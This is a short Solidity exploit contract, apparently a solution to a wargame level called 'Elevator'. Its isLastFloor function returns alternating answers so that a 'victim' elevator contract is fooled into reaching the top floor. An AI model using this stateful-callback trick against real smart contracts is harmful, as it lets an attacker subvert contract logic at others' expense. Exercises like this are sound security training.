// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    mapping(uint256 => uint256) floorCount;

    function isLastFloor(uint256 _floor) public returns (bool) {
        floorCount[_floor] += 1;
        return floorCount[_floor] % 2 == 0;
    }

    function goTo(address victim, uint256 _floor) public {
        IElevator(victim).goTo(_floor);
    }
}
